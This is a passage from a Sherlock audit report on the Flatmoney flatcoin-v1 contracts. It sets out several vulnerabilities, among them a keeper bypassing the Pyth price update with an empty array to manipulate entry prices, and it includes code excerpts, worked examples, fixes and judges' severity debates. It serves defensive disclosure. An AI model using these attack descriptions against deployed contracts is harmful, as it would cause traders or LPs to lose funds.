But, since the wrong formula is used, `announceWithdraw` will not revert as it should have as LongSkew is not greater than 1.2.

**0xLogos**

@NishithPat 

I mean there is no situations when correct check in stable withdraw execution allows execution, but announcment is reverting because of this incorrect check.

It's addition to first escalation because to fully invalidate this issue you need to ensure that incorrect check wil not cause dos to legitimate orders.

**NishithPat**

I don't think I understand what you are trying to convey.

All I am trying to say is that `announceWithdraw` must revert as well and not just `executeWithdraw` when longSkew becomes greater than max skew. For this, I have provided my reasons above.

Anyway, I have said what I wanted to say. I believe this issue is valid. The sponsors do think the same, as they have fixed the issue.

I am okay with whatever the judges decide.

**xiaoming9090**

Disagree with the escalator that the impact is QA/Low.

NishithPat has made a valid and comprehensive response to the escalations. I would like to add to his response.

The impact of this issue is not just limited to the waste of gas. We must understand that all trading operations (open/adjust/close order, deposit/withdraw) are time-sensitive in the real world.

Let's assume that using the current formula `announceWithdraw`, the withdrawal trade order will be executed because the `longSkewFraction` is not greater than 1.2 (`skewFractionMax`). However, when it is time for its execution using the `executeWithdraw` function, it reverts due to this check `vault.checkSkewMax({additionalSkew: 0})`.

This kind of outcome is absolutely unacceptable for a trading system in the real world. The trading system is effectively misleading the traders in the first place, telling them that the system will execute their withdrawal as they have already verified that the withdrawal will not cause the system's skew ratio to exceed the limit.

All orders must wait for a period before they can be executed, and only one order can be queued for each user at any time. This means that while the withdrawal trade order is in the queue, the users cannot perform any other operations, such as open/adjust position, even if they wish.

After the holding period has passed, the keeper takes the withdrawal trade order and executes it. Only then, the system will tell the users that the system has to invalidate the user's withdrawal trade order (because the system has used the wrong checkSkew formula in the first place). The users might keep repeatedly trying to withdraw and only realize that their withdrawal orders get invalidated much later when executed, not knowing what the underlying issue/bug is.

Lastly, I have already shown the math with real numbers where the checkSkew formula does not detect skew while they should be in the report.

**ydspa**

> Disagree with the escalator that the impact is QA/Low.
> 
> NishithPat has made a valid and comprehensive response to the escalations. I would like to add to his response.
> 
> The impact of this issue is not just limited to the waste of gas. We must understand that all trading operations (open/adjust/close order, deposit/withdraw) are time-sensitive in the real world.
> 
> Let's assume that using the current formula `announceWithdraw`, the withdrawal trade order will be executed because the `longSkewFraction` is not greater than 1.2 (`skewFractionMax`). However, when it is time for its execution using the `executeWithdraw` function, it reverts due to this check `vault.checkSkewMax({additionalSkew: 0})`.
> 
> This kind of outcome is absolutely unacceptable for a trading system in the real world. The trading system is effectively misleading the traders in the first place, telling them that the system will execute their withdrawal as they have already verified that the withdrawal will not cause the system's skew ratio to exceed the limit.
> 
> All orders must wait for a period before they can be executed, and only one order can be queued for each user at any time. This means that while the withdrawal trade order is in the queue, the users cannot perform any other operations, such as open/adjust position, even if they wish.
> 
> After the holding period has passed, the keeper takes the withdrawal trade order and executes it. Only then, the system will tell the users that the system has to invalidate the user's withdrawal trade order (because the system has used the wrong checkSkew formula in the first place). The users might keep repeatedly trying to withdraw and only realize that their withdrawal orders get invalidated much later when executed, not knowing what the underlying issue/bug is.
> 
> Lastly, I have already shown the math with real numbers where the checkSkew formula does not detect skew while they should be in the report.

I think the above debate fall into the following sherlock rule:
>8. Opportunity Loss is not considered a loss of funds by Sherlock.


And also this issue is not a break of core functionality that make contract useless, therefore LOW is suitable

**NishithPat**

> The users might keep repeatedly trying to withdraw and only realize that their withdrawal orders get invalidated much later when executed, not knowing what the underlying issue/bug is.

This comment by the LSW pretty much sums it up. Users will repeatedly try to call the announce withdraw function, not realizing why their withdrawal gets reverted. Then they don't just spend gas for 1 extra transaction, they do it for several transactions.  They don't have to wait for 1 minute, but they need to wait for several minutes because of the wrong implementation of checkSkewMax in the announceWithdraw function.

Also, think about the case of emergencies when users want to withdraw the underlying assets from the protocol. Because of this improper implementation in the announceWithdraw function, users who are trying to withdraw and get their orders invalidated will try to withdraw several times, not realizing why their orders get invalidated. And when they do realize after several attempts, it will already be too late by then as several minutes would have passed by. In such cases, there would definitely be a loss of funds for the user.

The issue cannot be QA.

**Czar102**

I am siding with the escalation. https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/193#issuecomment-1959803953 also explains the reasoning well.

Planning to accept the escalation and invalidate the issue.

**nevillehuang**

@Czar102 As mentioned by LSW, the max skew intended by protocol is 20%, but because of this issue, it will allow potential bypass. The trading opportunity cost impact is definitely not valid, but I believe the impact highlighted warrants medium severity.

> The purpose of the long max skew (skewFractionMax) is to prevent the FlatCoin holders from being increasingly short. However, the existing controls are not adequate, resulting in the long skew exceeding the long max skew deemed acceptable by the protocol, as shown in the example above.

> When the FlatCoin holders are overly net short, an increase in the collateral price (rETH) leads to a more pronounced decrease in the price of UNIT, amplifying the risk and loss of the FlatCoin holders and increasing the risk of UNIT's price going to 0.



**santipu03**

@nevillehuang The statement that the long skew will exceed the long max skew is wrong. 

Refer to my escalation [here](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/193#issuecomment-1955045330)


**nevillehuang**

@santipu03 Apologies, agree, it will revert [here](https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L305), so this issue can be invalid.

**Czar102**

Result:
Low
Has duplicates

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [santipu03](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/193/#issuecomment-1955045330): accepted
- [NishithPat](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/193/#issuecomment-1955687103): rejected

# Issue H-10: Malicious keepers can manipulate the price when executing an order 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/194 

## Found by 
LTDingZhen, nobody2018, xiaoming90
## Summary

Malicious keepers can manipulate the price when executing an order by selecting a price in favor of either the LPs or long traders, leading to a loss of assets to the victim's party.

## Vulnerability Detail

When the keeper executes an order, it was understood from the protocol team that the protocol expects that the keeper must also update the Pyth price to the latest one available off-chain. In addition, the [contest page](https://github.com/sherlock-audit/2023-12-flatmoney-xiaoming9090?tab=readme-ov-file#q-are-there-any-off-chain-mechanisms-or-off-chain-procedures-for-the-protocol-keeper-bots-input-validation-expectations-etc) mentioned that "an offchain price that is pulled by the keeper and pushed onchain at time of any order execution".

This requirement must be enforced to ensure that the latest price is always used.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L386

```solidity
File: DelayedOrder.sol
378:     function executeOrder(
379:         address account,
380:         bytes[] calldata priceUpdateData
381:     )
382:         external
383:         payable
384:         nonReentrant
385:         whenNotPaused
386:         updatePythPrice(vault, msg.sender, priceUpdateData)
387:         orderInvariantChecks(vault)
388:     {
389:         // Settle funding fees before executing any order.
390:         // This is to avoid error related to max caps or max skew reached when the market has been skewed to one side for a long time.
391:         // This is more important in case the we allow for limit orders in the future.
392:         vault.settleFundingFees();
..SNIP..
410:     }
```

However, this requirement can be bypassed by malicious keepers. A keeper could skip or avoid the updating of the Pyth price by passing in an empty `priceUpdateData` array, which will pass the empty array to the `OracleModule.updatePythPrice` function.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/abstracts/OracleModifiers.sol#L12

```solidity
File: OracleModifiers.sol
10:     /// @dev Important to use this modifier in functions which require the Pyth network price to be updated.
11:     ///      Otherwise, the invariant checks or any other logic which depends on the Pyth network price may not be correct.
12:     modifier updatePythPrice(
13:         IFlatcoinVault vault,
14:         address sender,
15:         bytes[] calldata priceUpdateData
16:     ) {
17:         IOracleModule(vault.moduleAddress(FlatcoinModuleKeys._ORACLE_MODULE_KEY)).updatePythPrice{value: msg.value}(
18:             sender,
19:             priceUpdateData
20:         );
21:         _;
22:     }
```

When the Pyth's `Pyth.updatePriceFeeds` function is executed, the `updateData` parameter will be set to an empty array.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L64

```solidity
File: OracleModule.sol
64:     function updatePythPrice(address sender, bytes[] calldata priceUpdateData) external payable nonReentrant {
65:         // Get fee amount to pay to Pyth
66:         uint256 fee = offchainOracle.oracleContract.getUpdateFee(priceUpdateData);
67: 
68:         // Update the price data (and pay the fee)
69:         offchainOracle.oracleContract.updatePriceFeeds{value: fee}(priceUpdateData);
70: 
71:         if (msg.value - fee > 0) {
72:             // Need to refund caller. Try to return unused value, or revert if failed
73:             (bool success, ) = sender.call{value: msg.value - fee}("");
74:             if (success == false) revert FlatcoinErrors.RefundFailed();
75:         }
76:     }
```

Inspecting the source code of Pyth's on-chain contract, the [`Pyth.updatePriceFeeds`](https://goerli.basescan.org/address/0xf5bbe9558f4bf37f1eb82fb2cedb1c775fa56832#code#F24#L75) function will not perform any update since the `updateData.length` will be zero in this instance.

https://goerli.basescan.org/address/0xf5bbe9558f4bf37f1eb82fb2cedb1c775fa56832#code#F24#L75

```solidity
function updatePriceFeeds(
    bytes[] calldata updateData
) public payable override {
    uint totalNumUpdates = 0;
    for (uint i = 0; i < updateData.length; ) {
        if (
            updateData[i].length > 4 &&
            UnsafeCalldataBytesLib.toUint32(updateData[i], 0) ==
            ACCUMULATOR_MAGIC
        ) {
            totalNumUpdates += updatePriceInfosFromAccumulatorUpdate(
                updateData[i]
            );
        } else {
            updatePriceBatchFromVm(updateData[i]);
            totalNumUpdates += 1;
        }

        unchecked {
            i++;
        }
    }
    uint requiredFee = getTotalFee(totalNumUpdates);
    if (msg.value < requiredFee) revert PythErrors.InsufficientFee();
}
```

The keeper is permissionless, thus anyone can be a keeper and execute order on the protocol. If this requirement is not enforced, keepers who might also be LPs (or collude with LPs) can choose whether to update the Pyth price to the latest price or not, depending on whether the updated price is in favor of the LPs. For instance, if the existing on-chain price (\$1000 per ETH) is higher than the latest off-chain price (\$950 per ETH), malicious keepers will use the higher price of \$1000 to open the trader's long position so that its position's entry price will be set to a higher price of \$1000. When the latest price of \$950 gets updated, the longer position will immediately incur a loss of \$50. Since this is a zero-sum game, long traders' loss is LPs' gain.

Note that per the current design, when the open long position order is executed at $T2$, any price data with a timestamp between $T1$ and $T2$ is considered valid and can be used within the `executeOpen` function to execute an open order. Thus, when the malicious keeper uses an up-to-date price stored in Pyth's on-chain contract, it will not revert as long as its timestamp is on or after $T1$.

![image](https://github.com/sherlock-audit/2023-12-flatmoney-xiaoming9090/assets/102820284/8ca41703-96c6-4cfe-bfc5-161f59ecaddf)

Alternatively, it is also possible for the opposite scenario to happen where the keepers favor the long traders and choose to use a lower older price on-chain to execute the order instead of using the latest higher price. As such, the long trader's position will be immediately profitable after the price update. In this case, the LPs are on the losing end.

Sidenote: The oracle's `maxDiffPercent` check will not guard against this attack effectively. For instance, in the above example, if the Chainlink price is \$975 and the `maxDiffPercent` is 5%, the Pyth price of \$950 or \$1000 still falls within the acceptable range. If the `maxDiffPercent` is reduced to a smaller margin, it will potentially lead to a more serious issue where all the transactions get reverted when fetching the price, breaking the entire protocol.

## Impact

Loss of assets as shown in the scenario above.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/DelayedOrder.sol#L386

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/abstracts/OracleModifiers.sol#L12

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L64

## Tool used

Manual Review

## Recommendation

Ensure that the keepers must update the Pyth price when executing an order. Perform additional checks against the `priceUpdateData` submitted by the keepers to ensure that it is not empty and `priceId` within the `PriceInfo` matches the price ID of the collateral (rETH), so as to prevent malicious keeper from bypassing the price update by passing in an empty array or price update data that is not mapped to the collateral (rETH).



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  invalid



**rashtrakoff**

I don't believe this is an issue due to the check for price freshness [here](https://github.com/dhedge/flatcoin-v1/blob/ea561f48bd9eae11895fc5e4f476abe909d8a634/src/OracleModule.sol#L131). However we can probably implement the suggestion for more protection.

**nevillehuang**

@rashtrakoff If I understand correctly, as long as freshness of price does not exceed `maxAge`, it is an accepted updated price, if not it will revert, hence making this issue invalid.

**nevillehuang**

Hi @rashtrakoff here is LSW comments, which seems valid to me.

> The check at Line 111 basically checks for deviation between the on-chain and off-chain price deviation. If the two prices deviate by a certain percentage `maxDiffPercent` (I recall the test or deployment script set it as 5%), the TX will revert.

> However, it is incorrect that this check will prevent this issue. I expected that the sponsor might assume that this check might prevent this issue during the audit. Thus, in the report (at the end of the "Vulnerability Detail"), I have documented the reasons why this oracle check would not help to prevent this issue, and the example and numbers in the report are specially selected to work within the 5% price deviation 🙂

> Sidenote: The oracle's maxDiffPercent check will not guard against this attack effectively. For instance, in the above example, if the Chainlink price is $975 and the maxDiffPercent is 5%, the Pyth price of $950 or $1000 still falls within the acceptable range. If the maxDiffPercent is reduced to a smaller margin, it will potentially lead to a more serious issue where all the transactions get reverted when fetching the price, breaking the entire protocol.

**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/277.

**0xLogos**

Escalate

Low (med at best)

Oracle's prices discrepancy should be within trader fee charged. 

**sherlock-admin2**

> Escalate
> 
> Low (med at best)
> 
> Oracle's prices discrepancy should be within trader fee charged. 

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**xiaoming9090**

> Escalate
> 
> Low (med at best)
> 
> Oracle's prices discrepancy should be within trader fee charged.

The escalation is invalid.

The report's sidenote and my comment shared by the lead judge have explained why the existing price deviation control does not prevent this attack.

**Czar102**

I agree with @xiaoming9090, I don't see a valid point in the escalation.

Planning to reject the escalation and leave the issue as is.

**nevillehuang**

Agree with @xiaoming9090 and @Czar102 

**Czar102**

Result:
High
Has duplicates

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [0xLogos](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/194/#issuecomment-1956855342): rejected

# Issue H-11: Long trader's deposited margin can be wiped out 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/195 

## Found by 
0xrobsol, Bony, deepplus, evmboi32, petro1912, santipu\_, shaka, xiaoming90
## Summary

Long Trader's deposited margin can be wiped out due to a logic error, leading to a loss of assets.

## Vulnerability Detail

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L232

```solidity
File: FlatcoinVault.sol
216:     function settleFundingFees() public returns (int256 _fundingFees) {
..SNIP..
226:         // Calculate the funding fees accrued to the longs.
227:         // This will be used to adjust the global margin and collateral amounts.
228:         _fundingFees = PerpMath._accruedFundingTotalByLongs(_globalPositions, unrecordedFunding);
229: 
230:         // In the worst case scenario that the last position which remained open is underwater,
231:         // we set the margin deposited total to 0. We don't want to have a negative margin deposited total.
232:         _globalPositions.marginDepositedTotal = (int256(_globalPositions.marginDepositedTotal) > _fundingFees)
233:             ? uint256(int256(_globalPositions.marginDepositedTotal) + _fundingFees)
234:             : 0;
235: 
236:         _updateStableCollateralTotal(-_fundingFees);
```

#### Issue 1

Assume that there are two long positions in the system and the `_globalPositions.marginDepositedTotal` is $X$.

Assume that the funding fees accrued to the long positions at Line 228 is $Y$. $Y$ is a positive value indicating the overall gain/profit that the long traders received from the LPs. 

In this case, the `_globalPositions.marginDepositedTotal` should be set to $(X + Y)$ after taking into consideration the funding fee gain/profit accrued by the long positions.

However, in this scenario, $X < Y$​. Thus, the condition at Line 232 will be evaluated as `false,` and the ` _globalPositions.marginDepositedTotal` will be set to zero. This effectively wipes out all the margin collateral deposited by the long traders in the system, and the deposited margin of the long traders is lost.

#### Issue 2

The second issue with the current implementation is that it does not accurately capture scenarios where the addition of `_globalPositions.marginDepositedTotal` and `_fundingFees` result in a negative number. This is because `_fundingFees` could be a large negative number that, when added to `_globalPositions.marginDepositedTotal`, results in a negative total, but the condition at Line 232 above still evaluates as true, resulting in an underflow revert.

## Impact

Loss of assets for the long traders as mentioned above.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/FlatcoinVault.sol#L232

## Tool used

Manual Review

## Recommendation

If the intention is to ensure that `_globalPositions.marginDepositedTotal` will never become negative, consider summing up $(X + Y)$​ first and determine if the result is less than zero. If yes, set the `_globalPositions.marginDepositedTotal` to zero.

The following is the pseudocode:

```solidity
newMarginTotal = globalPositions.marginDepositedTota + _fundingFees;
globalPositions.marginDepositedTotal = newMarginTotal > 0 ? uint256(newMarginTotal) : 0;
```



## Discussion

**sherlock-admin**

2 comment(s) were left on this issue during the judging contest.

**ubl4nk** commented:
> invalid -> when marginDepositedTotal is less than Zero, all the long-traders all liquidated + some loss for LPs where that position is liquidated a bit late.

**takarez** commented:
>  valid: same fix with issue 181; high(2)



**sherlock-admin**

The protocol team fixed this issue in PR/commit https://github.com/dhedge/flatcoin-v1/pull/275.

**midori-fuse**

Escalate

#181 is a dupe of this issue because:
- This report mentions a general scenario where the calculation in line 232 fails to accurately account for either outcome of the ternary operation.
- "Issue 2" of this report mentions the same scenario as with 181, albeit less generalized.
- The fixes are identical.

Furthermore, report #78 is the report that accurately spells out the full problem with the current implementation (it encompasses both of #195 and #181), and thus all dupes of the given two issues should be duped under it.

**sherlock-admin2**

> Escalate
> 
> #181 is a dupe of this issue because:
> - This report mentions a general scenario where the calculation in line 232 fails to accurately account for either outcome of the ternary operation.
> - "Issue 2" of this report mentions the same scenario as with 181, albeit less generalized.
> - The fixes are identical.
> 
> Furthermore, report #78 is the report that accurately spells out the full problem with the current implementation (it encompasses both of #195 and #181), and thus all dupes of the given two issues should be duped under it.

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**xiaoming9090**

Disagree with the escalation. Report [181](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/181) pointed out an issue due to an underflow bug when performing the casting. This report ([195](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/195)) pointed out a logical error in the math operation. Thus, they are two distinct issues.

On a side note, I have seen a few escalations regarding the sponsor's similar fixes (Same PR); thus, those issues with the same PR fix should be duplicated. However, the PR 275 (https://github.com/dhedge/flatcoin-v1/pull/275) is private. No one at this point apart from the sponsor knows the fix's implementation. One PR/commit can contain many different fixes for multiple reports. Also, we have not done the fix review yet, so one cannot conclude that the fix implemented is correct at this point. Thus, any argument regarding the same PR fix == duplicate in all the escalations in this contest is not well established.

**midori-fuse**

Thank you for your input. I edited my escalation to add some more points. 

I do agree however that the same fix does not warrant the issue being a dupe. 

**0xjuaan**

> Disagree with the escalation. Report [181](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/181) pointed out an issue due to an underflow bug when performing the casting. This report ([195](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/195)) pointed out a logical error in the math operation. Thus, they are two distinct issues.

But the underflow error in report 181 is due to the same logical error in the math. Simply, the logic improperly handles the case where `abs(_fundingFees) >= _globalPositions.marginDepositedTotal`. While there are 2 separate impacts of this bad logic, the root cause is the exact same. It is explained in detail in issue #78 

Also @nevillehuang , if these two issues (#181 and #195) end up being considered as two separate issues, shouldn't that mean that my report (#78) would come under both issues and be rewarded as such? Since I covered both impacts in detail, under the same root cause. But now if the two impacts are being paid separately, then I believe that my report should be paid for both impacts.


**nevillehuang**

@0xjuaan The root causes seems to be different though as pointed out by @xiaoming9090. But I agree that your issue points out both scenarios. Even though the same fix PR is applied, I believe the fix would involve different logic

1. Underflow due to erroneous casting
2. Logical error in math operations 

**0xjuaan**

But the underflow occurs due to the logical error in math. 

> I believe the fix would involve different logic

The fix shown in #78 (and also in this issue's recommendation) is sufficient to fix both issues, since it mitigates the core math error (incorrect handling of `abs(_fundingFees) >= _globalPositions.marginDepositedTotal`) that is responsible for the 2 separate impacts.

Anyway, if you still don't agree- is it possible to add my submission to this issue?

**nevillehuang**

@rashtrakoff would it be ok to allow viewing the fix involved in this issue?

@0xjuaan I don’t believe sherlock has made this exception before. I will review the fix and come to a decision

**rashtrakoff**

@nevillehuang let me know if you need any access for fix PR.

**Czar102**

I believe these submissions present a single issue of using a formula that would prevent an underflow for unsigned integer subtraction instead of signed integer addition. Using a wrong formula to have several code fragments wrong is a single mistake.

Planning to consider #181 a duplicate of this issue and accept the escalation.

**nevillehuang**

After reviewing the fix (it is singular), I agree with @Czar102.

**Czar102**

Result:
High
Has duplicates

**sherlock-admin2**

Escalations have been resolved successfully!

Escalation status:
- [midori-fuse](https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/195/#issuecomment-1955855979): accepted

# Issue H-12: Long traders unable to withdraw their assets 

Source: https://github.com/sherlock-audit/2023-12-flatmoney-judging/issues/196 

## Found by 
CL001, shaka, xiaoming90
## Summary

Whenever the protocol reaches a state where the long trader's profit is larger than LP's stable collateral total, the protocol will be bricked. As a result, the margin deposited and gain of the long traders can no longer be withdrawn and the LPs cannot withdraw their collateral, leading to a loss of assets for the  users.

## Vulnerability Detail

Per Line 97 below, if the collateral balance is less than the tracked balance, the `_getCollateralNet` invariant check will revert.

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/misc/InvariantChecks.sol#L97

```solidity
File: InvariantChecks.sol
089:     /// @dev Returns the difference between actual total collateral balance in the vault vs tracked collateral
090:     ///      Tracked collateral should be updated when depositing to stable LP (stableCollateralTotal) or
091:     ///      opening leveraged positions (marginDepositedTotal).
092:     /// TODO: Account for margin of error due to rounding.
093:     function _getCollateralNet(IFlatcoinVault vault) private view returns (uint256 netCollateral) {
094:         uint256 collateralBalance = vault.collateral().balanceOf(address(vault));
095:         uint256 trackedCollateral = vault.stableCollateralTotal() + vault.getGlobalPositions().marginDepositedTotal;
096: 
097:         if (collateralBalance < trackedCollateral) revert FlatcoinErrors.InvariantViolation("collateralNet");
098: 
099:         return collateralBalance - trackedCollateral;
100:     }
```

Assume that:

- Bob's long position: Margin = 50 ETH
- Alice's LP: Deposited = 50 ETH
- Collateral Balance = 100 ETH
- Tracked Balance = 100 ETH (Stable Collateral Total = 50 ETH, Margin Deposited Total = 50 ETH)

Assume that Bob's long position gains a profit of 51 ETH.

The following actions will trigger the `updateGlobalPositionData` function internally: executeOpen, executeAdjust, executeClose, and liquidation.

When the ` FlatcoinVault.updateGlobalPositionData` function is triggered to update the global position data:

```solidity
profitLossTotal = 51 ETH (gain by long)

newMarginDepositedTotal = marginDepositedTotal + marginDelta + profitLossTotal
newMarginDepositedTotal = 50 ETH + 0 + 51 ETH = 101 ETH

_updateStableCollateralTotal(-51 ETH)
newStableCollateralTotal = stableCollateralTotal + _stableCollateralAdjustment
newStableCollateralTotal = 50 ETH + (-51 ETH) = -1 ETH
stableCollateralTotal = (newStableCollateralTotal > 0) ? newStableCollateralTotal : 0;
stableCollateralTotal = 0
```

In this case, the state becomes as follows:

- Collateral Balance = 100 ETH
- Tracked Balance = 101 ETH (Stable Collateral Total = 0 ETH, Margin Deposited Total = 101 ETH)

Notice that the Collateral Balance and Tracked Balance are no longer in sync. As such, the revert will occur when the `_getCollateralNet` invariant checks are performed.

Whenever the protocol reaches a state where the long trader's profit is larger than LP's stable collateral total, this issue will occur, and the protocol will be bricked. The margin deposited and gain of the long traders can no longer be withdrawn from the protocol. The LPs also cannot withdraw their collateral.

The reason is that the `_getCollateralNet` invariant checks are performed in all functions of the protocol that can be accessed by users (listed below):

- Deposit
- Withdraw
- Open Position
- Adjust Position
- Close Position
- Liquidate

## Impact

Loss of assets for the users. Since the protocol is bricked due to revert, the long traders are unable to withdraw their deposited margin and gain and the LPs cannot withdraw their collateral.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/misc/InvariantChecks.sol#L97

## Tool used

Manual Review

## Recommendation

Currently, when the loss of the LP is more than the existing `stableCollateralTotal`, the loss will be capped at zero, and it will not go negative. In the above example, the `stableCollateralTotal` is 50, and the loss is 51. Thus, the `stableCollateralTotal` is set to zero instead of -1.

The loss of LP and the gain of the trader should be aligned or symmetric. However, this is not the case in the current implementation. In the above example, the gain of traders is 51, while the loss of LP is 50, which results in a discrepancy here.

To fix the issue, the loss of LP and the gain of the trader should be aligned. For instance, in the above example, if the loss of LP is capped at 50, then the profit of traders must also be capped at 50.

Following is a high-level logic of the fix:

```solidity
If (profitLossTotal > stableCollateralTotal): // (51 > 50) => True
	profitLossTotal = stableCollateralTotal // profitLossTotal = 50
	
newMarginDepositedTotal = marginDepositedTotal + marginDelta + profitLossTotal // 50 + 0 + 50 = 100
	
newStableCollateralTotal = stableCollateralTotal + (-profitLossTotal) // 50 + (-50) = 0
stableCollateralTotal = (newStableCollateralTotal > 0) ? newStableCollateralTotal : 0; // stableCollateralTotal = 0
```

The comment above verifies that the logic is working as intended.



## Discussion

**sherlock-admin**

1 comment(s) were left on this issue during the judging contest.

**takarez** commented:
>  valid: high(6)



**ydspa**

Escalate

This should be a medium issue, as the likelihood is extreme low due to strict external market conditions
>Flatcoin can be net short and ETH goes up 5x in a short period of time, potentially leading to UNIT going to 0.
https://audits.sherlock.xyz/contests/132

Meet sherlock's rule for Medium
>Causes a loss of funds but requires certain external conditions or specific states

But not meet the rule for High
>Definite loss of funds without (extensive) limitations of external conditions

**sherlock-admin2**

> Escalate
> 
> This should be a medium issue, as the likelihood is extreme low due to strict external market conditions
> >Flatcoin can be net short and ETH goes up 5x in a short period of time, potentially leading to UNIT going to 0.
> https://audits.sherlock.xyz/contests/132
> 
> Meet sherlock's rule for Medium
> >Causes a loss of funds but requires certain external conditions or specific states
> 
> But not meet the rule for High
> >Definite loss of funds without (extensive) limitations of external conditions

You've created a valid escalation!

To remove the escalation from consideration: Delete your comment.

You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.

**xiaoming9090**

Disagree with the escalation. The following point in the escalation is simply a remark by the protocol team stating that if the ETH goes up 5x, the value of UNIT token will go down to zero

> Flatcoin can be net short and ETH goes up 5x in a short period of time, potentially leading to UNIT going to 0.
> https://audits.sherlock.xyz/contests/132

It has nothing to do with preventing the protocol from reaching a state where the long trader's profit is larger than LP's stable collateral total. 

On the other hand, this point made by the protocol team actually reinforces the case I made in the report. The point by the protocol team highlighted the fact that the ETH can go up significantly over a short period of time. When this happens,  the long trader's profit will be large. Thus, it will cause the protocol to reach a state where the long trader's profit is larger than LP's stable collateral total, which triggers this issue. When this happens, the protocol will be bricked, thus justified for a High.

Also, the requirement for High is "Definite loss of funds without (extensive) limitations of external conditions". This issue can occur without extensive external conditions as only one condition, which is the price of the ETH goes up significantly, is needed to trigger the bug. Thus, it meets the requirement of a High issue.

**Czar102**

@xiaoming9090 aren't protocol risk parameters set not to allow the long traders' profits to be larger than LP funds?

**xiaoming9090**

> @xiaoming9090 aren't protocol risk parameters set not to allow the long traders' profits to be larger than LP funds?

@Czar102 The risk parameter I'm aware of is the `skewFractionMax` parameter, which prevents the system from having too many long positions compared to short positions. The maximum ratio of long to short position size is 1.2 (120% long: 100% long) during the audit. The purpose of limiting the number of long positions is to avoid the long side wiping out the value of the short side (LP) too quickly when the ETH price goes up.

However, I'm unaware of any restrictions constraining long traders' profits. The long traders' profits will increase along with the increase in ETH price.

**Czar102**

So, the price needs to go up 5x in order to trigger this issue?

**xiaoming9090**

@Czar102 Depending on the `skewFractionMax` parameter being configured at any single point of time. The owner can change this value via the `setSkewFractionMax` function. The higher the value is, the smaller the price increase needed to trigger the issue.

If the `skewFractionMax` is set to 20%, 5x will cause the LP's UNIT holding to drop to zero. Thus, slightly more than 5x will trigger this issue.
Sidenote: The 20% is chosen in this report since it was mentioned in the contest's README 

**Czar102**

I think this is a fair assumption to have these values set so that other positions will practically never go into negative values – so this bug will practically never be triggered. Hence, the assumptions for this issue to be triggered are quite extensive.

Planning to accept the escalation and consider this issue a Medium severity one.

**0xjuaan**

So it seems that in order for this issue to be triggered, ETH has to rise 5x in a short period of time. 

However in the 'known issues/acceptable risks that should not result in a valid finding' section of the contest README, it says:

> theoretically, if ETH price increases by 5x in a short period of time whilst the flatcoin holders are 20% short, it's possible for flatcoin value to go to 0. This scenario is deemed to be extremely unlikely and the funding rate is able to move quickly enough to bring the flatcoin holders back to delta neutral.

Since that scenario is required to trigger this issue, this issue should not be deemed as valid. 

**xiaoming9090**

> So it seems that in order for this issue to be triggered, ETH has to rise 5x in a short period of time.
> 
> However in the 'known issues/acceptable risks that should not result in a valid finding' section of the contest README, it says:
> 
> > theoretically, if ETH price increases by 5x in a short period of time whilst the flatcoin holders are 20% short, it's possible for flatcoin value to go to 0. This scenario is deemed to be extremely unlikely and the funding rate is able to move quickly enough to bring the flatcoin holders back to delta neutral.
> 
> Since that scenario is required to trigger this issue, this issue should not be deemed as valid.

The README mentioned that the team is aware of a scenario where the price can go up significantly, leading the LP's Flatcoin value to go to 0. However, that does not mean that the team is aware of other potential consequences when this scenario happens.

**0xjuaan**

But surely if the sponsor deemed that the very rapid 5x price increase of ETH is extremely unlikely, that means that its an acceptable risk that they take on. So any issue which relies on that scenario is a part of that same acceptable risk, so shouldn't be valid right?

The sponsor clarified why they accept this risk and issues relating to this scenario shouldn't be reported, [in this public discord message](https://discord.com/channels/812037309376495636/1199005620536356874/1202614374703824927)

> Hello everyone. I believe some of you guys might have a doubt whether UNIT going to 0 is an issue or not. I believe it was mentioned that UNIT going to 0 is a known behaviour of the system but the reason might not be clear as to why. If the collateral price increases by let's say 5x (in case the skew limit is 120%), the entire short side (UNIT LPs) will be liquidated (though not liquidated in the same way as how leveraged longs are). The system will most likely not be able to recover as longs can simply close their positions and the take away the collateral. The hope is that this scenario doesn't play out in the future due to informed LPs and funding rate and other incentives but we know this is crypto and anything is possible here. Just wanted to clarify this so that we don't get this as a reported issue.


**xiaoming9090**

The team is aware and has accepted that FlatCoin's value (short-side/LP) will go to zero when the price goes up significantly.
